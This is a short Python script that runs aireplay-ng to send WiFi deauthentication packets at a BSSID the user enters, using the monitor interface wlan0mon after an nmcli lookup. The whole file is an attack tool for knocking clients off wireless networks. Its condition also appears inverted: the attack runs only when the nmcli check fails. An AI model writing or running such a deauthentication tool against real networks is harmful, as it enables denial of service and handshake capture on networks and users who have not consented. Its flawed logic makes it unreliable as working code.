from subprocess import run
import shlex


def deauthenticate(bssid,pack,iface):
    aireplay_args = shlex.split(f"sudo aireplay-ng -a {bssid} -0 {pack} {iface}")
    nmcli_args = shlex.split(f"nmcli d wifi list ifname {iface} bssid {bssid}")
    nmcli_output = run(nmcli_args,capture_output=True,text=True)
    if nmcli_output.returncode :
       run(aireplay_args,capture_output=True,text=True)
       print("[+]Deauth is raning...")
    else:
        return nmcli_output.stdout

if __name__ == "__main__":
    bssid = str(input("--bssid="))
    deauthenticate(bssid,10,"wlan0mon")

